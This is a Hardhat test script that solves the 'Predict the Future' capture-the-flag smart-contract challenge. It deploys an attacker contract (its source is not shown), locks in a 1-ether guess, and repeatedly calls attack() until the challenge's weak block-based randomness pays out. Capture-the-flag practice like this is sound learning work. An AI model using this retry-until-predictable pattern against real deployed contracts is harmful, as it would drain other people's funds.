import {ethers} from "hardhat";
import {Contract, Signer} from "ethers";
import {expect} from "chai";

let accounts: Signer[];
let attacker: Signer;
let contract: Contract; // challenge contract
let sendValue = ethers.utils.parseEther("1");

const sleep = (ms: number) =>
    new Promise((resolve) => setTimeout(resolve, ms));

before(async function () {
    accounts = await ethers.getSigners();
    attacker = accounts[0];
    const factory = await ethers.getContractFactory("PredictTheFutureChallenge", attacker);
    contract = factory.attach(`0x970Fb26cB793316a353A6B9d5D8C9D1CF21E594f`);
});

it("solves the challenge", async function () {
    const factory = await ethers.getContractFactory("PredictTheFutureAttacker", attacker);
    let attackerContract = await factory.deploy(contract.address);
    let pretx = await attackerContract.lock({value: sendValue, gasLimit: 1e5});
    console.log("prepare tx hash:", pretx.hash);
    await sleep(1e4);
    let flag = false;
    while (!flag) {
        try {
            let tx = await attackerContract.attack({gasLimit: 1e5});
            console.log("attack tx hash:", tx.hash);
        } catch (error) {
            console.log(error);
        }
        flag = await contract.isComplete();
        await sleep(2e3);
    }
});

after(async function () {
    expect(await contract.isComplete()).to.eq(true);
});